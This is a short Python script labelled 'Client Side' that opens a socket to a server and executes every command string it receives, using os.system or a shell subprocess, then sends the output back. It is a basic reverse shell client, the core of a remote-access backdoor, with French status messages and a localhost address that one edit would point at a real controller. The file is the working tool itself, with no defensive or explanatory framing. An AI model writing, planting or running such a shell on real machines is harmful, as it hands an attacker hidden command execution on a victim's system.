import socket
import os
import subprocess as sp

print("//~~ Client Side ~~//")

host, port = ("127.0.0.1", 10000)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

while True:
    result = sock.recv(1024)
    result = result.decode()

    if "mkdir" in result:
        os.system(result)
        sock.sendall(b"Repertoire creer !")
    elif "cd" in result:
        os.system(result)
        sock.sendall(b"Vous etes bien entre dans le fichier !")
    else:
        output = sp.Popen(result, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE, shell=True)
        out, err = output.communicate()
        sock.sendall(out + err)

sock.close()